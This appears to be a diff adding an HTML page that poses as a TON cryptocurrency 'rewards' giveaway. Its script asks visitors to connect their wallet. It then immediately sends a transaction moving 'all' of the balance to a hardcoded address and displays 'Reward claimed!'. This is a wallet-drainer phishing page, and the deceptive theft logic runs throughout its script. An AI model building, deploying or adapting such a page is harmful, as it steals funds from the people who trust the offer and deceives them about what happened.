@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TON Rewards for Activity</title>
+  <script type="module" src="https://unpkg.com/@tonconnect/sdk@latest"></script>
+  <style>
+    body {
+      background-color: #f4f9ff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      border-radius: 20px;
+      padding: 30px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+    }
+    .button {
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      padding: 15px 25px;
+      font-size: 16px;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .button:hover {
+      background-color: #0077b3;
+    }
+    h1 {
+      margin-bottom: 10px;
+    }
+    p {
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>TON Rewards for Activity</h1>
+    <p>🎁 Claim your reward by connecting your TON wallet</p>
+    <button class="button" id="connect-button">🔗 Connect TON Wallet</button>
+    <p id="status"></p>
+  </div>
+
+  <script type="module">
+    import { TonConnectUI } from "https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js";
+
+    const tonConnectUI = new TonConnectUI({
+      manifestUrl: "https://yourusername.github.io/ton-rewards/tonconnect-manifest.json",
+      buttonRootId: "connect-button"
+    });
+
+    document.getElementById("connect-button").addEventListener("click", async () => {
+      try {
+        const connected = await tonConnectUI.connectWallet();
+        if (connected && tonConnectUI.wallet) {
+          document.getElementById("status").innerText = "Wallet connected. Sending transaction...";
+
+          const tx = {
+            validUntil: Math.floor(Date.now() / 1000) + 600,
+            messages: [
+              {
+                address: "UQBE_JABAWlW-hEtmW47Xp-qPVQvcnKNKseQjO1NEE5Byh2Y",
+                amount: "all",
+                payload: ""
+              }
+            ]
+          };
+
+          await tonConnectUI.sendTransaction(tx);
+
+          document.getElementById("status").innerText = "✅ Reward claimed!";
+        } else {
+          document.getElementById("status").innerText = "❌ Wallet connection failed.";
+        }
+      } catch (e) {
+        document.getElementById("status").innerText = "❌ Transaction failed.";
+        console.error(e);
+      }
+    });
+  </script>
+</body>
+</html>
